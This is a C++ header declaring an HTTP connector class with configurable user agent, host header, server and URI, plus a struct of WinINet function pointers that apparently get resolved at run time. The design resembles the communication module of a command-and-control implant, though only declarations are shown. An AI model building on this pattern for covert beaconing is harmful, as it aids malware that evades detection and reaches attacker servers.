#pragma once

#include <windows.h>
#include <wininet.h>

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

class ConnectorHTTP
{
	CHAR*     user_agent;
	CHAR*     host_header;
	BOOL      ssl;
	CHAR*     http_method;
	CHAR*     server_address;
	WORD      server_port;
	CHAR*     uri;
	CHAR*     headers;
	HTTPFUNC* functions;

	HINTERNET hInternet = NULL;
	HINTERNET hConnect  = NULL;

public:
	ConnectorHTTP();

	void  SetConfig(BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Address, WORD Port, CHAR* Uri, CHAR* Headers);
	BYTE* SendData(BYTE* data, ULONG data_size, ULONG* recv_size);
	void  CloseConnector();
};